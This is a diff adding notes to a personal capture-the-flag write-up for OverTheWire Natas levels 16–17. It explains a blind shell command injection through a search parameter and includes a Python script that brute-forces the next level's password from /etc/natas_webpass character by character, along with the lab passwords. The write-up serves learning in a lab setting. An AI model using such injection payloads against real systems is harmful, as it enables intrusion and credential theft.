@@ -217,4 +217,34 @@ if($key != "") {
     }
 }
 ?>
-looks related to encode and decode
+because of the double quotes in passthru and the quotes checking in preg_match, we cant search the text in /etc/natas_webpass/natas17 and show result directly
+but we could enter something like $(cat /etc/natas_webpass/natas17) to check the value in this file
+similar to level 15, we could manipulate the search result of dictonary.txt to identify whether a character is in /etc/natas_webpass/natas17
+for example, enter $(grep ! /etc/natas_webpass/natas17)dummy
+if there is an ! in natas17 file, the final search will be searching !dummy, which doesnt exist in dictionary
+if no ! in natas17 file, the final search is still searching dummy, which exists in dictionary
+---                                  
+#!/usr/bin/python3
+import requests
+import base64
+
+s=requests.Session()
+s.auth = ("natas16", "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V")
+possibles="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
+password="dummy"
+newpassword=""
+while(password != newpassword):
+    password=newpassword
+    for char in possibles:
+        result=s.get("http://natas16.natas.labs.overthewire.org/index.php?needle=$(grep ^" + password + char + " /etc/natas_webpass/natas17)dummy&submit=Search");
+        if "dummy" not in result.text:
+            newpassword=password+char
+            print(newpassword)
+            break
+---
+got XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
+
+level 17
+access http://natas17.natas.labs.overthewire.org/ with natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
+similar to level 15, but this time there is no echo
+when there is no different in content, 
